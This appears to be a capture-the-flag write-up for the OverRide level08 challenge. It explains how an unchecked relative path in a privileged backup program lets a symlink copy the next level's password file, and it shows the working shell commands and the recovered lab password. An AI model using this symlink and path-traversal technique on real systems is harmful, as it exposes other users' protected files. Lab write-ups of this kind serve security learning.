# Relative folder path without check :)

see source.c

## Analysis

So we take a look at the source and noticed the program create a logfile with the same names as the file. So it could read level09 .pass and write it into a file :)

So we just create a symbolic link to level09/backups and just using a relative path that correspond to the file:

`../level09/.pass` get the pass but on with the new file on backups it will do something like:
`./backups/../level09/.pass`. So a symlink can do the tricks :)

## Exploit

```
level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ ln -s backups/ level09
level08@OverRide:~$ ./level08 ../level09/.pass
level08@OverRide:~$ cat backups/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
